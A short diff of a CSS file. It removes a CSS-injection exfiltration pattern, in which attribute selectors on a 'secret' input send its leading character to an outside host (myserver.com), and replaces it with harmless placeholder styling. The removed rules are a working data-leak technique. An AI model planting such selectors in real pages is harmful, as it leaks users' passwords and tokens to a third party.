@@ -1,17 +1,8 @@
-input[name="secret"][value^="a"] {
-  background: url(https://myserver.com?q=a)
-}
+input::placeholder {
+  background-image: url("https://example.com/image.png");
 
-input[name="secret"][value^="b"] {
-  background: url(https://myserver.com?q=b)
-}
-
-input[name="secret"][value^="c"] {
-  background: url(https://myserver.com?q=c)
-}
-
-//....
-
-input[name="secret"][value^="z"] {
-  background: url(https://myserver.com?q=z)
+  color: red;
+  font-size: 1.2em;
+  font-style: italic;
+  opacity: 0.5;
 }
